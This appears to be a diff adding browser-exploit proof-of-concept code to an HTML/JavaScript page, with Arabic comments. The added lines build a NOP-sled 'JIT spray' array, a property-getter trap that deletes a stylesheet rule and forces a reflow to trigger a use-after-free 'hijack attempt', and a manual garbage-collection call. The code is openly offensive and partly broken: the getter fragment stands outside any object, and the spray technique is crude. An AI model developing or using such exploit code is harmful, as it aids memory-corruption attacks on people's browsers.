@@ -15,8 +15,45 @@
             logBox.innerHTML += `<div>[${time}ms] ${msg}</div>`;
             logBox.scrollTop = logBox.scrollHeight;
         }
+        
+        // أضف هذه الدالة قبل الـ window.onload
+function jitSpray() {
+    let code = new Uint32Array(0x1000);
+    // نملأ الذاكرة بـ NOP Sled أو عنوان وهمي نتحكم به
+    code.fill(0x90909090); 
+    return code;
+}
+
+// داخل الـ object.defineProperty (في مكان الـ TRAP):
+get() {
+    if (!fired && this === A) {
+        fired = true;
+        
+        // 1. تفعيل رش الـ JIT
+        jitSpray();
+        
+        // 2. تدمير الكائن الأصلي
+        document.getElementById('s').sheet.deleteRule(0);
+        
+        // 3. هنا اللحظة الحرجة: نحاول إجبار المحرك على استخدام عنواننا
+        // بدلاً من الـ layout reflow، نستخدم استدعاءً يسبب خطأ في الوصول للذاكرة
+        try {
+            document.body.offsetTop;
+        } catch(e) {}
+        
+        debug("CRITICAL: UAF Hijack attempt triggered.");
+    }
+    return undefined;
+}
+
 
         window.onload = () => {
+            // في بداية الـ onload
+if (window.gc) {
+    debug("Manual Garbage Collection triggered.");
+    window.gc(); 
+}
+
             debug("System Initialized. Loading PoC sequence...");
 
             // 1. تعريف الكائن A
